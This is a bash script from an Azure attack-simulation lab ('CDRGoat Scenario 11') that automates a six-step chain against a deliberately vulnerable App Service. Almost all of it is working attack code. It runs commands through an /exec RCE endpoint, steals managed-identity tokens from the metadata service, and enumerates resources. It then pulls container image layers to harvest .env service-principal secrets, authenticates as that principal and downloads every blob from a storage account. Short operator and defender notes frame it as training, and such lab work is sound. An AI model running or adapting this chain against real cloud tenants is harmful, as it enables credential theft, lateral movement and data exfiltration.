#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Azure - Scenario 11                ===" "${RESET}"
  printf "%sRCE → ACR Image Secrets → Lateral Movement%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Exploit RCE on App Service and steal MI tokens\n"
  printf "  • Step 2. Enumerate resources and discover ACR\n"
  printf "  • Step 3. Authenticate to ACR and list repositories\n"
  printf "  • Step 4. Pull image layers and extract embedded secrets\n"
  printf "  • Step 5. Authenticate as extracted SP (lateral movement)\n"
  printf "  • Step 6. Exfiltrate data from target Storage Account\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Step 1. Exploit RCE and steal MI tokens
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploit RCE on App Service and steal MI tokens  ===" "${RESET}"

step "Target input"
read -r -p "  App Service URL (e.g., https://streamgoat-11-app-xxxxx.azurewebsites.net): " APP_URL
APP_URL="${APP_URL%/}"

if [ -z "$APP_URL" ]; then
  err "App Service URL is required"
  exit 1
fi

step "Verifying RCE vulnerability"
spin_start "Testing /exec endpoint"

set +e
RCE_TEST="$(curl -sS --connect-timeout 10 "${APP_URL}/exec?cmd=id")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ] || [ -z "$RCE_TEST" ]; then
  err "Cannot reach the App Service"
  exit 1
fi

ok "RCE confirmed: ${RCE_TEST}"

step "Extracting identity endpoint from environment"
spin_start "Reading environment variables"

ENV_OUTPUT="$(curl -sS "${APP_URL}/exec?cmd=env" | grep -E 'IDENTITY_ENDPOINT|IDENTITY_HEADER|AZURE_CLIENT_ID' || true)"
spin_stop

IDENTITY_ENDPOINT="$(echo "$ENV_OUTPUT" | grep IDENTITY_ENDPOINT | cut -d= -f2-)"
IDENTITY_HEADER="$(echo "$ENV_OUTPUT" | grep IDENTITY_HEADER | cut -d= -f2-)"
MI_CLIENT_ID="$(echo "$ENV_OUTPUT" | grep AZURE_CLIENT_ID | cut -d= -f2-)"

if [ -z "$IDENTITY_ENDPOINT" ]; then
  info "Identity endpoint not in env, trying App Service MI endpoint"
  IDENTITY_ENDPOINT="http://169.254.169.254/metadata/identity/oauth2/token"
fi

info "Identity Endpoint: ${YELLOW}${IDENTITY_ENDPOINT:0:60}...${RESET}"
info "MI Client ID: ${YELLOW}${MI_CLIENT_ID}${RESET}"

step "Stealing ARM token via MI"
spin_start "Requesting management token"

if [ -n "$IDENTITY_HEADER" ]; then
  # App Service identity endpoint
  ARM_TOKEN_CMD="curl -s -H 'X-IDENTITY-HEADER: ${IDENTITY_HEADER}' '${IDENTITY_ENDPOINT}?api-version=2019-08-01&resource=https://management.azure.com&client_id=${MI_CLIENT_ID}'"
else
  # IMDS fallback
  ARM_TOKEN_CMD="curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com&client_id=${MI_CLIENT_ID}'"
fi

set +e
ARM_TOKEN_JSON="$(curl -sS "${APP_URL}/exec?cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${ARM_TOKEN_CMD}'''))")")"
set -e
spin_stop

ARM_TOKEN="$(echo "$ARM_TOKEN_JSON" | jq -r '.access_token // empty')"

if [ -z "$ARM_TOKEN" ]; then
  err "Failed to steal ARM token"
  echo "$ARM_TOKEN_JSON" | head -5
  exit 1
fi

ok "ARM token stolen"

# Parse JWT
TOKEN_PAYLOAD="$(echo "$ARM_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"
TENANT_ID="$(echo "$TOKEN_PAYLOAD" | jq -r '.tid')"

# Get subscription
SUBS_JSON="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01")"
SUB_ID="$(echo "$SUBS_JSON" | jq -r '.value[0].subscriptionId')"

info "Tenant: ${YELLOW}${TENANT_ID}${RESET}"
info "Subscription: ${YELLOW}${SUB_ID}${RESET}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We exploited RCE on the App Service and stole the MI's ARM token.\n"
printf "The MI has ${YELLOW}AcrPull${RESET} on a Container Registry and ${YELLOW}Reader${RESET} on the RG.\n\n"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Enumerate resources
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Enumerate resources and discover ACR  ===" "${RESET}"

step "Listing resources"
spin_start "Calling ARM resources API"

RESOURCES_JSON="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2022-12-01")"

spin_stop

RESOURCE_GROUP="$(echo "$RESOURCES_JSON" | jq -r '.value[0].id | split("/")[4]')"

echo "$RESOURCES_JSON" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • [\(.type)] \($Y)\(.name)\($R)"'

ACR_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.ContainerRegistry/registries") | .name')"

if [ -z "$ACR_NAME" ] || [ "$ACR_NAME" = "null" ]; then
  err "No Container Registry found"
  exit 1
fi

ok "Found ACR: ${YELLOW}${ACR_NAME}${RESET}"

# Get ACR login server
ACR_DETAILS="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.ContainerRegistry/registries/${ACR_NAME}?api-version=2023-01-01-preview")"

ACR_LOGIN_SERVER="$(echo "$ACR_DETAILS" | jq -r '.properties.loginServer')"
info "ACR Login Server: ${YELLOW}${ACR_LOGIN_SERVER}${RESET}"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Authenticate to ACR
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Authenticate to ACR and list repositories  ===" "${RESET}"

step "Getting ACR access token"
spin_start "Exchanging ARM token for ACR refresh token"

# Exchange ARM token for ACR refresh token
set +e
ACR_REFRESH="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=access_token&service=${ACR_LOGIN_SERVER}&tenant=${TENANT_ID}&access_token=${ARM_TOKEN}" \
  "https://${ACR_LOGIN_SERVER}/oauth2/exchange")"
set -e
spin_stop

ACR_REFRESH_TOKEN="$(echo "$ACR_REFRESH" | jq -r '.refresh_token // empty')"

if [ -z "$ACR_REFRESH_TOKEN" ]; then
  err "Failed to get ACR refresh token"
  exit 1
fi

# Get ACR access token for repository operations
ACR_ACCESS="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&service=${ACR_LOGIN_SERVER}&scope=registry:catalog:*&refresh_token=${ACR_REFRESH_TOKEN}" \
  "https://${ACR_LOGIN_SERVER}/oauth2/token")"

ACR_TOKEN="$(echo "$ACR_ACCESS" | jq -r '.access_token // empty')"

ok "ACR access token acquired"

step "Listing repositories"
spin_start "GET /v2/_catalog"

REPOS_JSON="$(curl -sS -H "Authorization: Bearer $ACR_TOKEN" \
  "https://${ACR_LOGIN_SERVER}/v2/_catalog")"

spin_stop

REPOS="$(echo "$REPOS_JSON" | jq -r '.repositories[]')"
ok "Found repositories:"
echo "$REPOS" | while read -r repo; do
  printf "  • %s%s%s\n" "$YELLOW" "$repo" "$RESET"
done

# Get tags for each repo
TARGET_REPO="$(echo "$REPOS" | head -1)"
step "Listing tags for ${TARGET_REPO}"

# Get repo-scoped token
REPO_ACCESS="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&service=${ACR_LOGIN_SERVER}&scope=repository:${TARGET_REPO}:pull&refresh_token=${ACR_REFRESH_TOKEN}" \
  "https://${ACR_LOGIN_SERVER}/oauth2/token")"
REPO_TOKEN="$(echo "$REPO_ACCESS" | jq -r '.access_token')"

TAGS_JSON="$(curl -sS -H "Authorization: Bearer $REPO_TOKEN" \
  "https://${ACR_LOGIN_SERVER}/v2/${TARGET_REPO}/tags/list")"

echo "$TAGS_JSON" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.tags[] | "  • \($Y)\(. )\($R)"'

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Pull image layers and extract secrets
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Pull image layers and extract embedded secrets  ===" "${RESET}"

TARGET_TAG="latest"
step "Pulling manifest for ${TARGET_REPO}:${TARGET_TAG}"
spin_start "GET manifest"

MANIFEST="$(curl -sS \
  -H "Authorization: Bearer $REPO_TOKEN" \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  "https://${ACR_LOGIN_SERVER}/v2/${TARGET_REPO}/manifests/${TARGET_TAG}")"

spin_stop

LAYER_COUNT="$(echo "$MANIFEST" | jq '.layers | length')"
ok "Manifest has ${YELLOW}${LAYER_COUNT}${RESET} layers"

echo "$MANIFEST" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.layers[] | "  • \($Y)\(.digest[:24])...\($R) (size: \(.size) bytes)"'

step "Downloading and inspecting layers via RCE"

# Download each layer on the App Service and search for secrets
for i in $(seq 0 $((LAYER_COUNT - 1))); do
  DIGEST="$(echo "$MANIFEST" | jq -r ".layers[$i].digest")"
  SIZE="$(echo "$MANIFEST" | jq -r ".layers[$i].size")"

  spin_start "Downloading layer $((i+1))/${LAYER_COUNT} (${SIZE} bytes)"

  # Download and extract on the App Service via RCE
  DOWNLOAD_CMD="cd /tmp && curl -sS -H 'Authorization: Bearer ${REPO_TOKEN}' -o layer_${i}.tar.gz 'https://${ACR_LOGIN_SERVER}/v2/${TARGET_REPO}/blobs/${DIGEST}' && tar xzf layer_${i}.tar.gz 2>/dev/null && find . -name '.env' -o -name '*.env' -o -name 'credentials*' 2>/dev/null | head -5"

  set +e
  FOUND_FILES="$(curl -sS "${APP_URL}/exec?cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${DOWNLOAD_CMD}'''))")")"
  set -e

  spin_stop

  if [ -n "$FOUND_FILES" ] && [ "$FOUND_FILES" != "" ]; then
    ok "Found secret files in layer $((i+1)):"
    echo "$FOUND_FILES" | while read -r f; do
      [ -n "$f" ] && printf "  • %s%s%s\n" "$RED" "$f" "$RESET"
    done

    # Read the .env file
    READ_CMD="cat /tmp/.env 2>/dev/null || cat /tmp/app/.env 2>/dev/null || echo 'File not found'"
    ENV_CONTENT="$(curl -sS "${APP_URL}/exec?cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${READ_CMD}'''))")")"

    if [ -n "$ENV_CONTENT" ] && ! echo "$ENV_CONTENT" | grep -q "not found"; then
      printf "\n%s%s%s\n" "${BOLD}${RED}" "=== SECRETS FOUND IN CONTAINER IMAGE ===" "${RESET}"
      printf "\n  %s--- .env from image layer ---%s\n" "$YELLOW" "$RESET"
      echo "$ENV_CONTENT"
      printf "\n"

      # Parse credentials
      EXTRACTED_CLIENT_ID="$(echo "$ENV_CONTENT" | grep AZURE_CLIENT_ID | cut -d= -f2)"
      EXTRACTED_SECRET="$(echo "$ENV_CONTENT" | grep AZURE_CLIENT_SECRET | cut -d= -f2)"
      EXTRACTED_TENANT="$(echo "$ENV_CONTENT" | grep AZURE_TENANT_ID | cut -d= -f2)"

      ok "Credentials extracted from container image!"
      break
    fi
  else
    info "Layer $((i+1)): no secret files found"
  fi
done

if [ -z "${EXTRACTED_CLIENT_ID:-}" ]; then
  err "Could not extract credentials from image layers"
  exit 1
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We pulled container image layers from ACR and found a ${RED}.env file${RESET}\n"
printf "baked into the image with Service Principal credentials.\n\n"
printf "This is one of the most common container security mistakes:\n"
printf "  • Developers COPY .env files into Docker images\n"
printf "  • Secrets persist in image layers even if deleted later\n"
printf "  • ACR images are treated as 'internal' and rarely scanned\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Authenticate as extracted SP
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Authenticate as extracted SP (lateral movement)  ===" "${RESET}"

step "Authenticating with credentials from container image"
spin_start "Requesting ARM token via client_credentials"

set +e
SP_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${EXTRACTED_CLIENT_ID}&client_secret=${EXTRACTED_SECRET}&grant_type=client_credentials&resource=https://management.azure.com" \
  "https://login.microsoftonline.com/${EXTRACTED_TENANT}/oauth2/token")"
set -e
spin_stop

SP_ARM_TOKEN="$(echo "$SP_TOKEN_RESP" | jq -r '.access_token // empty')"

if [ -z "$SP_ARM_TOKEN" ]; then
  err "Failed to authenticate as extracted SP"
  exit 1
fi

ok "Authenticated as ${RED}extracted SP${RESET} from container image"

step "Enumerating SP's accessible resources"
spin_start "Listing resources across subscriptions"

SP_RESOURCES="$(curl -sS -H "Authorization: Bearer $SP_ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2022-12-01")"

spin_stop

echo "$SP_RESOURCES" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • [\(.type)] \($Y)\(.name)\($R) (RG: \(.id | split("/")[4]))"'

# Find the target storage account
TARGET_SA="$(echo "$SP_RESOURCES" | jq -r '.value[] | select(.type == "Microsoft.Storage/storageAccounts") | select(.id | contains("target")) | .name' | head -1)"

if [ -z "$TARGET_SA" ] || [ "$TARGET_SA" = "null" ]; then
  TARGET_SA="$(echo "$SP_RESOURCES" | jq -r '.value[] | select(.type == "Microsoft.Storage/storageAccounts") | .name' | head -1)"
fi

ok "Found target storage: ${RED}${TARGET_SA}${RESET}"

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Exfiltrate from target storage
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Exfiltrate data from target Storage Account  ===" "${RESET}"

step "Getting storage token for extracted SP"
spin_start "Requesting storage token"

set +e
TGT_STORAGE_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${EXTRACTED_CLIENT_ID}&client_secret=${EXTRACTED_SECRET}&grant_type=client_credentials&resource=https://storage.azure.com" \
  "https://login.microsoftonline.com/${EXTRACTED_TENANT}/oauth2/token")"
set -e

TGT_STORAGE_TOKEN="$(echo "$TGT_STORAGE_RESP" | jq -r '.access_token // empty')"
spin_stop

ok "Storage token acquired"

step "Listing containers"
CONTAINERS_XML="$(curl -sS \
  -H "Authorization: Bearer $TGT_STORAGE_TOKEN" \
  -H "x-ms-version: 2020-10-02" \
  "https://${TARGET_SA}.blob.core.windows.net/?comp=list")"

CONTAINER_NAMES="$(echo "$CONTAINERS_XML" | grep -oP '<Name>\K[^<]+' || echo "$CONTAINERS_XML" | sed -n 's/.*<Name>\([^<]*\)<\/Name>.*/\1/p')"

echo "$CONTAINER_NAMES" | while read -r cn; do
  [ -n "$cn" ] && printf "  • %s%s%s\n" "$YELLOW" "$cn" "$RESET"
done

TARGET_CONTAINER="$(echo "$CONTAINER_NAMES" | head -1)"

step "Listing blobs in ${TARGET_CONTAINER}"
BLOBS_XML="$(curl -sS \
  -H "Authorization: Bearer $TGT_STORAGE_TOKEN" \
  -H "x-ms-version: 2020-10-02" \
  "https://${TARGET_SA}.blob.core.windows.net/${TARGET_CONTAINER}?restype=container&comp=list")"

BLOB_NAMES="$(echo "$BLOBS_XML" | grep -oP '<Name>\K[^<]+' || echo "$BLOBS_XML" | sed -n 's/.*<Name>\([^<]*\)<\/Name>.*/\1/p')"

step "Downloading exfiltrated data"
printf "\n%s%s%s\n" "${BOLD}${RED}" "=== EXFILTRATED DATA FROM TARGET RG ===" "${RESET}"

echo "$BLOB_NAMES" | while read -r blob; do
  [ -z "$blob" ] && continue
  printf "\n  %s--- %s ---%s\n" "$YELLOW" "$blob" "$RESET"
  curl -sS \
    -H "Authorization: Bearer $TGT_STORAGE_TOKEN" \
    -H "x-ms-version: 2020-10-02" \
    "https://${TARGET_SA}.blob.core.windows.net/${TARGET_CONTAINER}/${blob}"
  printf "\n"
done

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Exploited RCE on App Service, stole MI tokens\n"
printf "  2. Enumerated resources — found Azure Container Registry\n"
printf "  3. Authenticated to ACR using MI's AcrPull permission\n"
printf "  4. Pulled image layers, found .env with SP credentials baked in\n"
printf "  5. Authenticated as the extracted SP (cross-RG lateral movement)\n"
printf "  6. Exfiltrated sensitive data from target Storage Account\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Container image secrets exposed (SP credentials)\n"
printf "  • Cross-Resource Group lateral movement achieved\n"
printf "  • Financial data exfiltrated from isolated storage\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • ACR image pulls from App Service MI (if not expected)\n"
printf "  • RCE indicators (subprocess execution in App Service)\n"
printf "  • SP authentication from unexpected sources\n"
printf "  • Cross-RG resource access patterns\n"
printf "  • Scan container images for secrets in CI/CD pipelines\n"
